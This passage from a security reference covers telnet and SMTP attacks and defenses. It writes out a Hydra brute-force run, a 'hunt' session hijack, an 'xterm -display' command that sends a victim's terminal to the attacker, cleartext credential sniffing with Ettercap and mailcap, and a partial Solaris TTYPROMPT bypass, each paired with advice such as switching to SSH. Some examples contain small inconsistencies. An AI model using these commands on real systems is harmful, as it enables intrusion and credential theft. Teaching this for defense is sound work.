
# Brute-Force Telnet

Hydra can be used to brute-force telnet:
```bash
hydra -L usernames.txt -P passwords.txt telnet
```
Hydra v2.2 (c) 2002 by Hauser / THC - use allowed only for legal purposes.
Hydra is starting! [parallel tasks: 4, login tries: 9 (1:3/p3)] [23][telnet] login: jill password: i10v3jack
Hydra finished.

# Prevent Telnet Brute-Forcing

Please see “Common Defenses Against Brute-Force Attacks.

TCP Hijacking After a telnet user successfully logs in, it is possible for another user on the same network segment to hijack the session by using TCP-hijacking tools such as Huntcap.

# Hijack Telnet Sessions

Suppose a malicious user on a host with IP address 192.168.1.1 is on the same network segment as that of 192.168.1.2. If the user on 192.168.1.2 has a telnet connection established to 10.0.0.1, then a malicious user on 192.168.1.1 can hijack it using Huntcap:

```bash
[bash]# hunt -i eth0
/*
* hunt 1.5
* multipurpose connection / sniffer for Linux
* (c) 1998-2000 by kra
*/
starting hunt
--- Main Menu --- rcvpkt 0, free/alloc 63/64 -------
l1/w/r list/watch/reset connections
u) host up tests
a) arp/simple hijack (avoids ack storm if arp used)
s) simple hijack
d) daemons rst/arp/sniffer/mac
o) options
x) exit
*> s
0) 192.168.1.2 [52323] --> 10.0.0.1 [23]
```

choose conn> 0
dump connection y/n [n] n
Enter the command string you wish executed or [cr]> whoami
whoami
jack
Enter the command string you wish executed or [cr>

In this case, the malicious user ran the command whoami after hijacking the victim's telnet session. As shown, the command executed successfully, and its output displayed the victim's username “jack.” Similarly, a malicious user could also have issued a command such as

```
xterm -display 192.168.1.1:0
```

which would have a xterm opened by the victim user “jack” back to the malicious user. Of course, the malicious user would have to run a command such as

```
xhost +192.168.1.32
```

on his or her host in order to allow the xterm instance executed on the victim's host to display on his or her X server.

![](img/17cb132e62949dc7f5e0eadf90c71f51_124_0.png)

# Use SSH

Disable telnet and use a secure alternative such as SSH (version 2) instead.

Sniffing Because telnet is a clear-text protocol, it is possible to sniff the username and password being sent across the network. Many tools facilitate the capturing of telnet data and passwords.

# Sniff Telnet Authentication

Ettercap can be used to sniff usernames and passwords transmitted across a network during telnet authentication:

```bash
[bash]# ettercap -m -C -N
```
ettercap 0.6.7 (c) 2002 ALOR & NaGa

Your IP: 10.0.0.102 with MAC: 01:11:04:03:6A:A3 on Iface: eth0

Loading plugins... Done.

Resolving 1 hostnames...

* |==================================================| 100.0 %

Press 'h' for help...

Sniffing (MAC based): ANY <--> ANY

TCP + UDP packets... (default)

Collecting passwords...

07:04:58 10.0.0.102:4814 --> 192.168.1.1:123 telnet
```
USER: john
PASS: i1ovetln
```
![](img/17cb132e62949dc7f5e0eadf90c71f51_125.png)

# Do Not Use Telnet

Do not use a clear-text protocol such as telnet. Consider using SSH instead.

Software Vulnerabilities The telnet daemon involves a few remotely exploitable vulnerabilities. The next paragraph describes a vulnerability that was one of the easiest to exploit.

TTYPROMPT Buffer Overflow Vulnerability The version of /bin/login shipped with Solaris 2 was found to have a vulnerability involving the environment variable TTYPROMPT. In order to attack this vulnerability, the attacker would need to set the value of TTYPROMPT to a six-character string and send a string of 64 characters after the username upon connect. For example, consider an attacker attempting to exploit this vulnerability by logging in as user:

```
telnet> TTYPROMPT abdef
telnet -o 192.168.1.10...
Connected to somecompanyexample.com.
Escape character is '^'.
```
SunOS 5.6
```
Last login: Dec 10 12:19:10 from 10.0.0.2 bin@somecompanyexample.com
```

# SMTP (Simple Mail Transfer Protocol): 25 (TCP)

SMTP is a protocol used on the Internet to transfer e-mail messages.

Sniffing Since SMTP is a clear-text protocol, it is possible to capture data being sent across the network.

# Sniff SMTP Traffic

The mailcap program, a tool part of the sniff package, can be used to capture SMTP data on a network. While mailcap watches SMTP data on the network, it must be run on a machine that is on the same network segment as the victim.

```bash
[bash] mailcap
Kernel filter, protocol ALL, raw packet socket
mailcap: listening on eth0
From: joe@somecompanyexample.com Feb 4 15:24:57 2003
Received: from localhost (joe@localhost)
  by somecompanyexample.com (8.11.6/8.11.6) with ESMTP id h4Noun230
  for <someothercompany.org>; Tue, 4 Feb 2003 15:24:56 -0800 (PST)
Date: Tue, 4 Feb 2003 15:24:56 -0800 (PST)
From: Joe joe@somecompanyexample.com
X-X-Sender: joe@localhost.localdomain
To: someothercompany.org.com
Subject: Re: Your email
Message-ID: Pine.LNX.4.44.0302041524510.23193-100000@localhost.localdomain
MIME-Version: TEXT/PLAIN; charset=US-ASCII
```
Hello,

Thanks for your email. The password for your FTP account is 3dd!xyz.
Yes I know it is hard to remember, but its for your own security.

Thanks,
Joe.

# Encrypt E-mails

The GNU Privacy Guard set of tools can be used to facilitate the encryption of e-mails. Encourage users to encrypt e-mail containing sensitive information. Visit http://www.gnupg.org/ for more information on GNU Privacy Guard.

Software Vulnerabilities Sendmail is the most popular MTA (Mail Transfer Agent) used on the Internet. Sendmail is known to have many susceptible to remotely exploitable vulnerabilities.

- Sendmail Header Buffer Overflow Vulnerability This vulnerability was caused by a buffer overflow condition in Sendmail's header-parsing component. More specifically, Sendmail's crackaddr *addr failed to correctly handle < > characters in the string containing "From" address field in the mail header. For more details, visit http://www.cert.org/advisories/CA-2003-067.html and http://securityfocus.com/bid/6991.
- Sendmail MIME Vulnerability Sendmail version 8.8.3 introduced a new vulnerability caused by improper bounds checking while performing MIME conversions on e-mail messages. It was possible to exploit this vulnerability in order to run arbitrary commands on the Sendmail server by sending specially crafted messages that caused the Sendmail process to overwrite its internal stack space. See http://online.securityfocus.com/bid/685 for more information.
- Sendmail HELO Buffer Overflow A buffer overflow in older versions of Sendmail caused to crash when long strings were sent as a parameter to its HELO command. It was possible to remotely exploit this vulnerability in order to run arbitrary commands on the Sendmail server. More info can be found at http://www.eyee.com/html/Products/Retina/RTHs/Mail_Servers/141.html.
- Sendmail DNS Map TXT Record Buffer Overflow A buffer overflow vulnerability was found in the DNS handling of Sendmail code. This vulnerability was caused by improper bounds checking on data returned from the name server. This vulnerability leads to a buffer overflow, it is possible to exploit this vulnerability to run commands on the Sendmail server by making a malicious name server return a response of arbitrary length. More information can be found at http://online.securityfocus.com/bid/5122.
